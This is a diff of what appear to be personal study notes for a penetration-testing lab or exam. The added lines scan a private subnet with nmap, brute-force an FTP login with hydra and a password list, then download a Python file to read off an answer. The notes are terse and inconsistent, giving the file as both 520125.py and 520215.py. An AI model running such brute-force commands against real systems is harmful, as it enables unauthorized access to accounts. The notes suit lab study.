@@ -1043,8 +1043,18 @@ nmap -p 22 172.30.10.0/24 --open to check ip
 and scan 
 
 
+linux ftp subnet brute force - crack crede , file in home director y
 
-
+ftp hydra we can use 
+nmap -p 22 192.168.10.0/24 --open (you found 4 ips)
+- ping found ips to know which is linux with ttl value <= 64
+ hydra -l nick -P password.txt ftp://192.168.10.111
+Password found 
+- ftp 192.168.10.111
+- login ftp with that password 
+- get 520125.py file and bye the FTP and check on parrot cat 520125.py and open to get vendor homepage
+more 520215.py
+or cat 
 
 
 
